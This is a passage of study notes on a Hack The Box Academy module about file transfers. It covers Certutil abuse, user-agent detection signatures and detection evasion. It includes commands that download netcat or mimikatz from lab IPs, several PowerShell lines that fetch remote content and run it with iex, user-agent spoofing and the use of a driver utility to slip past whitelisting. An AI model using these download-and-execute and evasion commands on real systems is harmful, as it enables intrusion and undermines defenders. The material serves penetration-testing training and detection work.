**Certutil:** originally a certificate-services management tool, Certutil was found by Casey Smith (@subTee) to be abusable as a general-purpose downloader, effectively serving as a "defacto wget for Windows" available on every Windows version by default. The module notes this technique is now flagged by Windows' Antimalware Scan Interface (AMSI) as suspicious Certutil usage, making it less stealthy than it once was.
```cmd
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```
`-verifyctl` is the (repurposed) certificate-trust-verification function being abused here; `-split` splits the downloaded content appropriately; `-f` forces the operation even if there are warnings; the final argument is the URL to download from — the file is saved into the current directory using its original filename from the URL.

<a id="s8-6"></a>
### 8.6 Extra Practice
This closing note encourages actively exploring both the LOLBAS and GTFOBins websites and experimenting with as many of the listed file transfer techniques as possible, noting that some lesser-known binaries can be genuinely surprising in their capabilities. The rationale given is practical: having detailed personal notes on multiple obscure options in advance saves time during an actual assessment when a particular method is blocked, and sets up the module's final two sections on detection and evasion considerations.

---

<a id="s9"></a>
## 9. Detection

<a id="s9-1"></a>
### 9.1 Command-Line and User-Agent Detection
This section shifts to the defensive/detection side of file transfers. It opens by noting that command-line detection based on blacklisting specific strings is easy to bypass (even trivially, via case changes), whereas whitelisting all legitimate command lines in an environment — though more time-consuming to set up initially — is far more robust and enables fast, reliable detection and alerting on anything unusual. The section then pivots to a second detection angle: HTTP user-agent strings. Since most client-server protocols (HTTP especially) require negotiation about how content is delivered, HTTP clients identify themselves via a user-agent string — this applies not just to browsers (Firefox, Chrome) but to any HTTP client, including cURL, custom scripts, and common tools like sqlmap or Nmap. Defenders can build a baseline list of known-legitimate user agents (default OS processes, update services like Windows Update, AV updaters, etc.), feed that into a SIEM for threat hunting, and then investigate any anomalous user-agent strings that don't match the expected baseline as potential indicators of malicious file transfer activity.

<a id="s9-2"></a>
### 9.2 User Agent Signatures by Technique
This part catalogs the specific, often distinctive, user-agent strings produced by common Windows file-transfer techniques (tested on Windows 10 10.0.14393 with PowerShell 5), giving defenders concrete signatures to hunt for. Each technique is shown as a client-side command paired with the resulting server-side HTTP request headers it generates.

**Invoke-WebRequest / Invoke-RestMethod:**
```powershell
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```
Produces the user agent: `User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0` — the `WindowsPowerShell/5.1...` substring is the distinctive giveaway here.

**WinHttpRequest (COM object):**
```powershell
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText
```
Produces: `User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)` — the literal `WinHttp.WinHttpRequest.5` string stands out as a signature (note this is the same technique the earlier JavaScript `wget.js` example used internally).

**Msxml2 (COM object):**
```powershell
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.responseText
```
Produces a user agent mimicking Internet Explorer: `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)` — notably this one is designed to blend in with legitimate IE traffic, making it harder to distinguish by user agent alone, so other indicators (like the specific combination of headers: `UA-CPU`, `Accept-Language`) matter more here.

**Certutil:**
```cmd
C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```
Produces: `User-Agent: Microsoft-CryptoAPI/10.0` — a clearly distinctive, non-browser user agent that's an easy indicator to flag.

**BITS:**
```powershell
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t; 
PS C:\htb> iex $r
```
Produces: `User-Agent: Microsoft BITS/7.8` on an initial `HEAD` request — again a distinctive, easily-flaggable signature separate from normal browser traffic.

The module closes by noting this only scratches the surface, and recommends organizations build either a binary whitelist or a blacklist of known-malicious binaries, combined with hunting for anomalous user-agent strings, as a starting point — with deeper threat-hunting and detection techniques to be covered in later modules.

---

<a id="s10"></a>
## 10. Evading Detection

<a id="s10-1"></a>
### 10.1 Changing User Agent
Since the previous section showed defenders can blacklist specific user-agent strings (like `WindowsPowerShell/5.1...`), `Invoke-WebRequest` supports a `-UserAgent` parameter to override the default string with one mimicking a real browser (Internet Explorer, Firefox, Chrome, Opera, or Safari) — useful for blending in with legitimate browser traffic commonly seen on the target network.

**Step 1 — List PowerShell's built-in preset user-agent strings:**
```powershell
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```
This reflects over the `PSUserAgent` class's static properties, listing each named browser preset (`InternetExplorer`, `FireFox`, `Chrome`, `Opera`, `Safari`) alongside its actual user-agent string value, giving a ready reference of options to choose from.

**Step 2 — Use the Chrome preset for a download:**
```powershell
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
The first line retrieves the Chrome preset string into a variable; `-UserAgent $UserAgent` on the `Invoke-WebRequest` call overrides the default `WindowsPowerShell/...` user agent with this Chrome-mimicking one instead — confirmed in the module's captured Netcat output showing the request now presents as `AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6` rather than the earlier PowerShell signature, making it blend in better if Chrome is commonly used on the target's internal network.

<a id="s10-2"></a>
### 10.2 LOLBAS / GTFOBins for Evasion
When application whitelisting blocks common tools like PowerShell or Netcat outright, and command-line logging might alert defenders to suspicious activity regardless, "LOLBINs" (also referred to as "misplaced trust binaries") offer another evasion avenue — since they're legitimate, typically-whitelisted binaries already present on the system. The module's specific example is the Intel Graphics Driver's `GfxDownloadWrapper.exe`, present on some systems to periodically download configuration files, which can be invoked directly to download an arbitrary file instead:
```powershell
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```
The first argument is the source URL, the second is the destination path — the tool simply performs its normal "download a config file" function, just pointed at an attacker-chosen file instead. Because it's a legitimate, often-whitelisted driver utility, it may be permitted by application whitelisting and excluded from alerting entirely. The module notes this is just one example among many, and recommends checking the LOLBAS project (Windows) and GTFOBins (Linux, which at time of writing documented file-transfer capability in nearly 40 commonly installed binaries) for other suitable options available in a specific target environment.

<a id="s10-3"></a>
### 10.3 Closing Thoughts
The module's final section reflects on the breadth of file transfer techniques covered across Windows and Linux, and encourages practicing all of them throughout the rest of the Penetration Tester path. It frames this as building a flexible mental toolkit tied to common scenarios — e.g., having a web shell and needing to pull a file down for further enumeration (try Certutil), or needing to exfiltrate a file off a target (try an Impacket SMB server or a Python upload-capable web server) — and recommends periodically revisiting this module as a reference. It closes by encouraging ongoing exploration of the LOLBAS and GTFOBins projects specifically, to build familiarity with binaries not yet personally used, since a new or unfamiliar LOLBin/GTFOBin may be exactly what's needed to accomplish a file transfer goal in a future, more restrictive environment.

---

*End of notes — HTB Academy "File Transfers" module, Sections 1–10.*
